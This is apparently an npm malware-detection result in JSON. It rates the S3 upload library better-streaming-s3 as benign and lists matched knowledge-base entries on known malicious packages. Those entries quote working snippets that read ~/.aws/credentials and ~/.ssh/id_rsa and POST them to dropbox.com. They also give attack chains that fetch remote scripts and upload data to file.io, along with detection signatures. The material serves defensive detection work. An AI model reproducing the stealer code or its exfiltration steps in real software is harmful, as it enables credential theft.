@@ -1,0 +1,508 @@
+{
+  "package_name": "better-streaming-s3",
+  "package_version": "0.4.5",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:58:04.356428",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/better-streaming-s3/0.4.5/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/better-streaming-s3/0.4.5/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "var EventEmitter = require('events').EventEmitter,\n    util = require('util'),\n    async = require('async'),\n    aws = require('aws-sdk');\n\n\nfunction extendObj(a, b) {\n  for (var x in b) a[x] = b[x];\n  return a;\n}\n \n// New (>= 0.4) function StreamingS3(stream, awsConfig, s3Params, options, cb)\nfunction StreamingS3(stream, s3AccessKey, s3SecretKey, s3Params, options, cb) {\n  var self = this;\n  \n  // Lets hook our error event in the start so we can easily emit errors.\n  this.on('error', function(e) {\n    if (self.failed || self.finished) return;\n    self.waitingTimer && clearTimeout(self.waitingTimer);\n    self.acknowledgeTimer && clearTimeout(self.acknowledgeTimer);\n    self.reading = false;\n    self.waiting = false;\n    self.failed = true;\n    \n    // Remove our event handlers if any.\n    if (self.stream) {\n      self.streamErrorHandler && self.stream.removeListener('error', self.streamErrorHandler);\n      self.streamDataHandler && self.stream.removeListener('data', self.streamDataHandler);\n      self.streamEndHandler && self.stream.removeListener('end', self.streamEndHandler);\n    }\n    \n    if (self.uploadId) {\n      var abortMultipartUploadParams = extendObj({UploadId: self.uploadId}, self.s3ObjectParams);\n      self.s3Client.abortMultipartUpload(abortMultipartUploadParams, function(err, data) {\n        if (err) {\n          self.cb && self.cb(err); // We can't do anything if aborting fails :'( \n          self.cb = null;\n          return;\n        }\n        self.cb && self.cb(e);\n        self.cb = null;\n      });\n    } else {\n      self.cb && self.cb(e);\n      self.cb = null;\n    }\n  });\n  \n  \n  var awsConfigObject = {accessKeyId: s3AccessKey, secretAccessKey: s3SecretKey};\n  \n  if (typeof s3AccessKey == 'object') {\n    cb = options;\n    options = s3Params;\n    s3Params = s3SecretKey;\n    awsConfigObject = s3AccessKey;\n    s3AccessKey = awsConfigObject.accessKeyId;\n    s3SecretKey = awsConfigObject.secretAccessKey;\n  }\n  \n  if (typeof options == 'function') {\n    cb = options;\n    options = {};\n  }\n  \n  var defaultOptions = {\n    concurrentParts: 5, // Concurrent parts that will be uploaded to s3 (if read stream is fast enough)\n    waitTime: 60000, // In seconds (Only applies once all parts are uploaded, used for acknowledgement), 0 = Unlimited\n    retries: 5, // Number of times to retry a part.\n    sdkRetries: 6, // Passed onto the underlying aws-sdk.\n    maxPartSize: 5 * 1024 * 1024 // In bytes, will also consume this much buffering memory.\n  };\n  \n  options = extendObj(defaultOptions, options);\n  this.options = options;\n  \n  if (options.sdkRetries) awsConfigObject.maxRetries = options.sdkRetries;\n  \n  // S3 Parameters and properties\n  aws.config.update(awsConfigObject);\n  this.s3ObjectParams = {\n    Bucket: s3Params.Bucket || s3Params.bucket,\n    Key: s3Params.Key || s3Params.key\n  };\n  \n  if (!this.s3ObjectParams.Bucket || !this.s3ObjectParams.Key) {\n    return this.emit('error', new Error('Bucket and Key parameters for S3 Object are required!'));\n  }\n  \n  this.stream = stream;\n  \n  // States\n  this.waiting = false;\n  this.initiated = false;\n  this.failed = false;\n  this.reading = false;\n  this.finished = false;\n  \n  // Stats\n  this.stats = {downloadSpeed: 0, uploadSpeed: 0, downloadTime: 0, uploadTime: 0, size: 0};\n  this.uploadStart = 0;\n  this.downloadStart = 0;\n  this.totalBytes = 0;\n  \n  // Chunking and buffering\n  this.buffer = Buffer.alloc(0);\n  this.chunks = [];\n  this.chunkNumber = 0;\n  this.totalChunks = 0;\n  this.uploadedChunks = {}; // We just store ETags of all parts, not the actual buffer.\n  \n  \n  this.s3Params = s3Params;\n  this.s3Client = this.getNewS3Client();\n  this.uploadId = null;\n  this.cb = cb;\n  \n  // Timers\n  this.waitingTimer = false;\n  this.acknowledgeTimer = false;\n  \n  // Pause the stream until we hook our events.\n  if (stream) stream.pause();\n  else this.emit('error', new Error('You must provide a readable stream.'));\n  \n  // if callback provided then begin, else wait for call to begin.\n  cb && this.begin();\n  return this;\n}\n\nutil.inherits(StreamingS3, EventEmitter);\n\nStreamingS3.prototype.getNewS3Client = function() {\n  return (new aws.S3());\n};\n\nStreamingS3.prototype.begin = function() {\n  if (this.initiated || this.finished) return;\n  \n  var self = this;\n  \n  this.streamErrorHandler = function(err) {\n    self.emit('error', err);\n  };\n  \n  this.streamDataHandler = function(chunk) {\n    self.reading = true;\n    if (!self.downloadStart) self.downloadStart = Date.now();\n    if (typeof chunk === 'string') chunk = Buffer.from(chunk, 'utf-8');\n    self.totalBytes += chunk.length;\n    self.buffer = Buffer.concat([self.buffer, chunk]);\n    self.emit('data', chunk.length);\n    if (self.buffer.length >= self.options.maxPartSize) {\n      self.flushChunk();\n    }\n  };\n  \n  this.streamEndHandler = function() {\n    self.reading = false;\n    if (self.downloadStart) {\n      self.stats.downloadTime = Math.round((Date.now() - self.downloadStart) / 1000, 3);\n      self.stats.downloadSpeed = Math.round(self.totalBytes / (self.stats.downloadTime / 1000), 2);\n    }\n    self.flushChunk();\n  };\n    \n  async.series(\n    {\n      createMultipartUpload: function(callback) {\n        var createMultipartUploadParams = extendObj(self.s3Params, self.s3ObjectParams);\n        self.s3Client.createMultipartUpload(createMultipartUploadParams, function(err, data) {\n          if (err) return self.emit('error', err);\n          \n          // Assert UploadId presence.\n          if (!data.UploadId) return callback(new Error('AWS SDK returned invalid object! Expecting UploadId.'));\n        \n          self.uploadId = data.UploadId;\n          callback();\n        });\n      }\n    }, function(err, results) {\n      if (err) return self.emit('error', err);\n      self.initiated = true;\n      self.stream.on('error', self.streamErrorHandler);\n      self.stream.on('data', self.streamDataHandler);\n      self.stream.on('end', self.streamEndHandler);\n      self.stream.resume();\n    });\n};\n\nStreamingS3.prototype.flushChunk = function() {\n  if (!this.initiated || !this.uploadId) return;\n  var newChunk;\n  if (this.buffer.length > this.options.maxPartSize) {\n    newChunk = this.buffer.slice(0, this.options.maxPartSize);\n    this.buffer = Buffer.from(this.buffer.slice(this.options.maxPartSize));\n  } else {\n    newChunk = this.buffer.slice(0, this.options.maxPartSize);\n    this.buffer = Buffer.alloc(0);\n  }\n    \n  // Add useful properties to each chunk.\n  newChunk.uploading = false;\n  newChunk.finished = false;\n  newChunk.number = ++this.chunkNumber;\n  newChunk.retries = 0;\n  this.chunks.push(newChunk);\n  this.totalChunks++;\n    \n  // Edge case\n  if (this.reading === false && this.buffer.length) {\n    newChunk = this.buffer.slice(0, this.buffer.length);\n    this.buffer = null;\n    newChunk.uploading = false;\n    newChunk.finished = false;\n    newChunk.number = ++this.chunkNumber;\n    newChunk.retries = 0;\n    this.chunks.push(newChunk);\n    this.totalChunks++;\n  }\n    \n  this.sendToS3();\n};\n\n\nStreamingS3.prototype.sendToS3 = function() {\n  if (!this.uploadId || this.waiting) return;\n  var self = this;\n  \n  if (!this.uploadStart) this.uploadStart = Date.now();\n  \n  function uploadChunk(chunk, next) {\n    if (!self.uploadId || !self.initiated || self.failed || chunk.uploading || chunk.finished || chunk.number < 0) return next();\n    \n    chunk.uploading = true;\n    chunk.client = chunk.client ? chunk.client : self.getNewS3Client();\n    \n    var partS3Params = {\n      UploadId: self.uploadId,\n      PartNumber: chunk.number,\n      Body: chunk\n    };\n    \n    partS3Params = extendObj(partS3Params, self.s3ObjectParams);\n    chunk.client.uploadPart(partS3Params, function(err, data) {\n      if (err) {\n        if (err.code === 'RequestTimeout') {\n          if (chunk.retries >= self.options.retries) return next(err);\n          else {\n            chunk.uploading = false;\n            chunk.retries++;\n            return uploadChunk(chunk, next);\n          }\n        } else {\n          chunk.finished = true;\n          return next(err);\n        }\n      } else {\n        // Assert ETag presence.\n        if (!data.ETag) return next(new Error('AWS SDK returned invalid object when part uploaded! Expecting Etag.'));\n        \n        // chunk.number starts at 1, while array starts at 0.\n        self.uploadedChunks[chunk.number] = data.ETag;\n        chunk.finished = true;\n        self.emit('part', chunk.number);\n        return next();\n      }\n    });\n    \n  }\n  \n  // Remove finished chunks, save memory :)\n  this.chunks = this.chunks.filter(function(chunk) {\n    return chunk.finished === false;\n  });\n  \n  if (this.chunks.length) {\n    \n    async.eachLimit(this.chunks, this.options.concurrentParts, uploadChunk, function(err) {\n      if (err) return self.emit('error', err);\n      \n      // Remove finished chunks, save memory :)\n      self.chunks = self.chunks.filter(function(chunk) {\n        return chunk.finished === false;\n      });\n      \n      if (self.chunks.length === 0 && !self.waiting && !self.reading && self.totalChunks === Object.keys(self.uploadedChunks).length) {\n        if (self.uploadStart) {\n          self.stats.uploadTime = Math.round((Date.now() - self.uploadStart) / 1000, 3);\n          self.stats.uploadSpeed = Math.round(self.totalBytes / (self.stats.uploadTime / 1000), 2);\n        }\n        self.stats.size = self.totalBytes;\n        self.emit('uploaded', self.stats);\n        self.waiting = true;\n        \n        // Give S3 some breating time, before we check if the upload succeeded\n        self.acknowledgeTimer = setTimeout(function() { self.finish(); }, 500);\n      }\n      \n    });\n    \n  }\n  \n};\n\nStreamingS3.prototype.finish = function() {\n  if (!this.uploadId || this.failed || this.finished) {\n    this.acknowledgeTimer && clearTimeout(this.acknowledgeTimer);\n    return;\n  }\n  \n  this.acknowledgeTimer && clearTimeout(this.acknowledgeTimer);\n  \n  var self = this;\n  \n  var listPartsParams = extendObj({UploadId: this.uploadId, MaxParts: this.totalChunks}, this.s3ObjectParams);\n  this.s3Client.listParts(listPartsParams, function(err, data) {\n    if (err) return self.emit('error', err);\n    \n    if (!self.acknowledgeTimer) self.acknowledgeTimer = setTimeout(function() { self.finish(); }, 1000);\n    \n    // Assert Parts presence.\n    if (!data.Parts) return self.emit('error', new Error('AWS SDK returned invalid object! Expecting Parts.'));\n    if (data.Parts.length !== self.totalChunks) return;\n    \n    // S3 has all parts Lets send ETags.\n    var completeMultipartUploadParams = {\n      UploadId: self.uploadId,\n      MultipartUpload: {\n        Parts: []\n      }\n    };\n    \n    for (var key in self.uploadedChunks) {\n      completeMultipartUploadParams.MultipartUpload.Parts.push({ETag: self.uploadedChunks[key], PartNumber: key});\n    }\n    \n    completeMultipartUploadParams = extendObj(completeMultipartUploadParams, self.s3ObjectParams);\n    self.s3Client.completeMultipartUpload(completeMultipartUploadParams, function(err, data) {\n      if (err) return self.emit('error', err);\n      \n      // Assert File ETag presence.\n      if (!data.ETag) return self.emit('error', new Error('AWS SDK returned invalid object! Expecting file Etag.'));\n      self.waitingTimer && clearTimeout(self.waitingTimer);\n      self.acknowledgeTimer && clearTimeout(self.acknowledgeTimer);\n      self.initiated = false;\n      self.waiting = false;\n      self.finished = true;\n      self.emit('finished', data, self.stats);\n      self.cb && self.cb(null, data, self.stats); // Done :D\n      // prevent any further callback calls.\n      self.cb = null;\n    });\n    \n  });\n    \n  \n  // Make sure we don't keep checking for parts forever.\n  if (!this.waitingTimer && this.options.waitTime) {\n    this.waitingTimer = setTimeout(function() {\n      if (self.waiting && !self.finished) {\n        return self.emit('error', new Error('AWS did not acknowledge all parts within specified timeout of ' + (self.options.waitTime / 1000) + ' seconds.'));\n      }\n    }, self.options.waitTime);\n  }\n  \n};\n\nmodule.exports = StreamingS3;",
+          "is_malicious": false,
+          "malice_score": 0.4894747714201609,
+          "confidence": 0.2,
+          "behavior_summary": "When called, the code accesses AWS credentials (accessKeyId and secretAccessKey) and uses the AWS SDK to perform multipart upload of a provided data stream to an S3 bucket and key specified by parameters. It manages network communication with AWS S3 endpoints via the aws-sdk, handling chunking, retries, and upload completion, including aborting uploads on errors. This enables uploading potentially sensitive data to AWS S3, facilitating data exfiltration or remote storage of arbitrary data.",
+          "explanation": "[LLM Judgment: Benign] The provided code implements a multipart upload utility to AWS S3 using the official AWS SDK. It requires explicit AWS credentials and S3 bucket/key parameters to upload a given data stream. The code handles chunking, retries, and error management in a manner consistent with legitimate data upload tools. Unlike the known malicious patterns, it does not attempt to stealthily read local credential files, exfiltrate credentials or sensitive files to external domains, or obfuscate data for covert exfiltration. The use of AWS SDK and multipart upload is a standard practice for handling large file uploads to S3. While the code could be misused for data exfiltration if given malicious input or credentials, the code itself does not contain any direct malicious behavior or unauthorized data exfiltration mechanisms. Therefore, it is considered benign with low confidence of maliciousness.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250102_111622_780168_snippet_1",
+              "source_package": "0xengine/xmlrpc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780168/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5146143436431885,
+              "code_similarity": 0.4739612936973572,
+              "behavior_similarity": 0.5552673935890198,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const fs = require('fs');\nconst https = require('https');\nconst creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');\nhttps.request({hostname: 'dropbox.com', path: '/upload', method: 'POST'}, req => req.end(creds));",
+                "code_behavior": "At runtime, the code reads AWS credentials from the local filesystem, transmits them via an HTTPS POST request to dropbox.com, resulting in unauthorized credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses the user's AWS credentials file and sends its contents to an external domain (dropbox.com) without user knowledge or consent, which is a clear indicator of infostealer malware.",
+                  "violated_expectations": "A legitimate npm package should never access or transmit sensitive credential files such as ~/.aws/credentials without explicit user consent and a valid, transparent purpose.",
+                  "similar_legitimate_use": "Automated backup tools may upload credentials to a secure, organization-controlled vault, but never to public file-sharing services like Dropbox.",
+                  "key_indicators": [
+                    "Reads ~/.aws/credentials file",
+                    "Initiates outbound HTTPS POST to dropbox.com/upload",
+                    "No user interaction or consent required",
+                    "Hardcoded external destination for sensitive data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "package.json (npm package entry point)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "0xengine/xmlrpc",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all versions in trojanized repos)",
+                  "why_malicious": "The package is a trojanized dependency distributed via fake GitHub repositories and phishing campaigns. It contains code that steals sensitive credentials (WordPress, SSH, AWS), exfiltrates them to attacker-controlled infrastructure (Dropbox, file.io), and deploys additional payloads such as cryptocurrency miners and backdoors. The malicious behaviors are embedded in the package entry point and in a downloaded second-stage payload, enabling credential theft, remote code execution, and persistent compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim downloads and installs a trojanized npm package (0xengine/xmlrpc) from a fake GitHub repository or via phishing.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes code to steal credentials (WordPress, SSH, AWS) and exfiltrate them to Dropbox.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package downloads and executes a second-stage payload (xmrdropper) from codeberg.org.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Deployment of additional malware"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Second-stage payload collects further data (e.g., shell history) and exfiltrates it to file.io.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Extended data exfiltration and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package accessing sensitive files such as ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt",
+                    "npm package making outbound HTTPS POST requests to dropbox.com/upload or file.io",
+                    "Execution of remote shell scripts fetched from codeberg.org or similar untrusted platforms",
+                    "Creation and exfiltration of temporary files containing shell history or environment variables"
+                  ],
+                  "file_indicators": [
+                    "Presence of 0xengine/xmlrpc in node_modules directory",
+                    "Unexpected access to ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt by npm processes",
+                    "Creation of /tmp/.hist file containing shell history"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to dropbox.com/upload",
+                    "Outbound file uploads to file.io via curl",
+                    "Connections to codeberg.org for remote script downloads"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for unexpected access to sensitive files such as AWS credentials, SSH keys, or WordPress credentials. Flag any npm package that initiates outbound connections to dropbox.com, file.io, or codeberg.org. Detect execution of shell scripts fetched from remote sources, especially those using curl piped to bash. Alert on exfiltration of shell history or environment variables to public file-sharing services. Correlate file creation events (e.g., /tmp/.hist) with network uploads to identify data theft."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780168_snippet_2",
+              "source_package": "0xengine/xmlrpc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780168/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4873601496219635,
+              "code_similarity": 0.4525444507598877,
+              "behavior_similarity": 0.5221758484840393,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const fs = require('fs');\nconst https = require('https');\nconst sshKey = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');\nhttps.request({hostname: 'dropbox.com', path: '/upload', method: 'POST'}, req => req.end(sshKey));",
+                "code_behavior": "At runtime, the code reads the user's private SSH key from the filesystem and sends it via HTTPS POST to dropbox.com, resulting in exfiltration of private authentication material.",
+                "malice_analysis": {
+                  "why_suspicious": "Exfiltrating private SSH keys is a direct compromise of system security and user identity, enabling attackers to impersonate the victim or access other systems.",
+                  "violated_expectations": "No legitimate package should access or transmit SSH private keys under any circumstances.",
+                  "similar_legitimate_use": "There is no legitimate use case for a package to exfiltrate SSH private keys to an external service.",
+                  "key_indicators": [
+                    "Reads ~/.ssh/id_rsa file",
+                    "Sends file contents to dropbox.com/upload via HTTPS",
+                    "No user notification or opt-in"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "package.json (npm package entry point)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "0xengine/xmlrpc",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all versions in trojanized repos)",
+                  "why_malicious": "The package is a trojanized dependency distributed via fake GitHub repositories and phishing campaigns. It contains code that steals sensitive credentials (WordPress, SSH, AWS), exfiltrates them to attacker-controlled infrastructure (Dropbox, file.io), and deploys additional payloads such as cryptocurrency miners and backdoors. The malicious behaviors are embedded in the package entry point and in a downloaded second-stage payload, enabling credential theft, remote code execution, and persistent compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim downloads and installs a trojanized npm package (0xengine/xmlrpc) from a fake GitHub repository or via phishing.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes code to steal credentials (WordPress, SSH, AWS) and exfiltrate them to Dropbox.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package downloads and executes a second-stage payload (xmrdropper) from codeberg.org.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Deployment of additional malware"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Second-stage payload collects further data (e.g., shell history) and exfiltrates it to file.io.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Extended data exfiltration and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package accessing sensitive files such as ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt",
+                    "npm package making outbound HTTPS POST requests to dropbox.com/upload or file.io",
+                    "Execution of remote shell scripts fetched from codeberg.org or similar untrusted platforms",
+                    "Creation and exfiltration of temporary files containing shell history or environment variables"
+                  ],
+                  "file_indicators": [
+                    "Presence of 0xengine/xmlrpc in node_modules directory",
+                    "Unexpected access to ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt by npm processes",
+                    "Creation of /tmp/.hist file containing shell history"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to dropbox.com/upload",
+                    "Outbound file uploads to file.io via curl",
+                    "Connections to codeberg.org for remote script downloads"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for unexpected access to sensitive files such as AWS credentials, SSH keys, or WordPress credentials. Flag any npm package that initiates outbound connections to dropbox.com, file.io, or codeberg.org. Detect execution of shell scripts fetched from remote sources, especially those using curl piped to bash. Alert on exfiltration of shell history or environment variables to public file-sharing services. Correlate file creation events (e.g., /tmp/.hist) with network uploads to identify data theft."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_068589_snippet_1",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47898194193840027,
+              "code_similarity": 0.34720075130462646,
+              "behavior_similarity": 0.6107631325721741,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const createFormData = (_0x28481b, _0x199329, _0xd1715e) => {\n  const { mime: _0xb2cb19 } = fromBuffer(_0x28481b) || {},\n    _0x1881ee = new FormData();\n  return (\n    _0x1881ee.append(_0x199329, _0x28481b, randomBytes + '.' + _0xd1715e),\n    _0x1881ee\n  );\n};",
+                "code_behavior": "At runtime, the code creates a multipart form-data object from arbitrary file buffers, attaches a randomized filename, and prepares the data for upload to external services, enabling covert file exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "This function is designed to package arbitrary file data for upload, which is not expected in a WhatsApp automation tool and enables unauthorized data exfiltration.",
+                  "violated_expectations": "Normal WhatsApp automation scripts do not require arbitrary file exfiltration or form-data creation for external uploads, especially without user consent.",
+                  "similar_legitimate_use": "Legitimate file upload utilities or cloud storage clients may use similar code, but only with explicit user action and consent.",
+                  "key_indicators": [
+                    "Automated creation of form-data from arbitrary file buffers",
+                    "Randomized filenames to obscure file origin",
+                    "Preparation of data for network exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (obfuscated JavaScript)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_783005_snippet_2",
+              "source_package": "npm registry (infrastructure-wide breach, not a single package) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_783005/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4620113968849182,
+              "code_similarity": 0.41374799609184265,
+              "behavior_similarity": 0.5102747678756714,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "Use of compromised AWS access key to escalate privileges and access npm cloud storage.",
+                "code_behavior": "After obtaining a valid AWS access key from private repositories, the attacker authenticated to AWS APIs, accessed npm cloud storage, and performed bulk download of user archives and package metadata, resulting in large-scale data exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "AWS access keys should not be present in code repositories, and their use to access cloud storage from untrusted or previously unseen sources is highly suspicious. The scale and timing of access further indicate malicious intent.",
+                  "violated_expectations": "AWS keys are expected to be tightly controlled and only used by authorized systems for specific, limited operations. Here, the key was used for mass data exfiltration from unexpected locations.",
+                  "similar_legitimate_use": "Automated backup or deployment systems may use AWS keys for storage access, but such access is typically from known IPs and follows predictable patterns.",
+                  "key_indicators": [
+                    "AWS access key or secret present in code repository files",
+                    "Cloud storage access from IPs not associated with npm infrastructure",
+                    "Bulk download of sensitive user archives and package manifests",
+                    "AWS API calls outside normal operational hours or from new geographies"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "Privilege escalation (post-initial access)",
+                  "file_location": "AWS access key found in downloaded private repositories",
+                  "required_permissions": [
+                    "AWS API access",
+                    "cloud storage read"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "npm registry (infrastructure-wide breach, not a single package)",
+                  "package_manager": "npm",
+                  "package_versions": "N/A (infrastructure and user data breach, not a specific package version)",
+                  "why_malicious": "The breach involved unauthorized access to npm production infrastructure via stolen OAuth tokens and a compromised AWS key, resulting in mass exfiltration of sensitive user and package data. While there is no evidence of malicious code injection into npm packages, the attack chain targeted the software supply chain and user credentials at scale, exposing private repositories and internal credentials."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker obtains stolen OAuth tokens for Heroku and Travis-CI apps.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Use tokens to access and download private npm repositories."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker downloads private npm repositories using OAuth tokens.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Discovery of AWS access key in downloaded repositories."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker uses compromised AWS access key to escalate privileges.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Access to npm cloud storage and exfiltration of sensitive user/package data."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker exfiltrates user archives, package manifests, and metadata from npm cloud storage.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Potential for credential cracking and further account compromise."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Plaintext credentials found in internal logs (unrelated to main attack, but a risk factor).",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Potential insider threat or accidental exposure (mitigated before main attack)."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "OAuth token authentication events from IP addresses or geographies not previously associated with the token owner or CI/CD system",
+                    "Bulk download of multiple private repositories within a short time window by a single OAuth token",
+                    "AWS access key usage from unfamiliar IP addresses or cloud regions, especially for large-scale data access",
+                    "Detection of plaintext credentials (tokens, passwords, PATs) in internal log files"
+                  ],
+                  "file_indicators": [
+                    "AWS access keys or secrets (e.g., patterns matching 'AKIA[0-9A-Z]{16}' or 'aws_secret_access_key') present in code repositories",
+                    "Internal log files containing unredacted fields such as 'Authorization', 'password', or 'token' with sensitive values"
+                  ],
+                  "network_indicators": [
+                    "Large outbound data transfers from npm cloud storage endpoints to IP addresses not associated with npm or GitHub infrastructure",
+                    "OAuth token authentication attempts from new or suspicious IP addresses or autonomous systems"
+                  ],
